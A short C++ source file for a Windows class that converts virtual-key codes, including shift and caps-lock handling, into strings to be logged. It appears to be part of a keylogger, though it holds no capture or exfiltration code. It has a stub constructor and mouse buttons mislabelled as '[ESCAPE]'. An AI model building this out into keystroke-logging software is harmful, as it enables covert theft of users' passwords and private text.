//
// Created by actua on 5/21/2024.
//
#include "../include/Key.h"
#include <iostream>
#include <windows.h>

// Constructor to open the file
// pass the file name by reference const means that the file name cannot be changed
Key::Key(const std::string &fname) {}

// Translate the key to a string to log
#include <cctype> // Include this at the top of your file
std::string Key::translateKey(const signed char key) {
  std::string keyStr;
  switch (key) {
    case VK_LWIN:
      keyStr = "[WIN]";
    break;
    case VK_RWIN:
      keyStr = "[RWIN]";
    break;
    case VK_RETURN:
      keyStr = "[RETURN]\n";
      break;
    case VK_SPACE:
      keyStr = " ";
      break;
    case VK_BACK:
      keyStr = "[BACKSPACE]";
      break;
    case VK_TAB:
      keyStr = "[TAB]";
      break;
    case VK_SHIFT:
      keyStr = "[SHIFT]";
      break;
    case VK_CONTROL:
      keyStr = "[CONTROL]";
      break;
    case VK_MENU:
      keyStr = "[ALT]";
      break;
    case VK_LBUTTON:
    case VK_RBUTTON:
    case VK_MBUTTON:
    case VK_ESCAPE:
      keyStr = "[ESCAPE]";
      break;
    case VK_END:
      keyStr = "[END]";
      break;
    case VK_HOME:
      keyStr = "[HOME]";
      break;

    default:
      const bool shift = (GetKeyState(VK_SHIFT) & 0x8000);
      const bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);
      char ch = static_cast<signed char>(key);
      if (isalpha(ch)) {
        if (shift ^ capsLock) {
          ch = static_cast<signed char>(toupper(ch));
        } else {
          ch = static_cast<signed char>(tolower(ch));
        }
        keyStr += ch;
      } else if (ispunct(ch)) {
        keyStr += ch;
      } else {
        keyStr = ch;
      }
      break;
  }
  return keyStr;
}
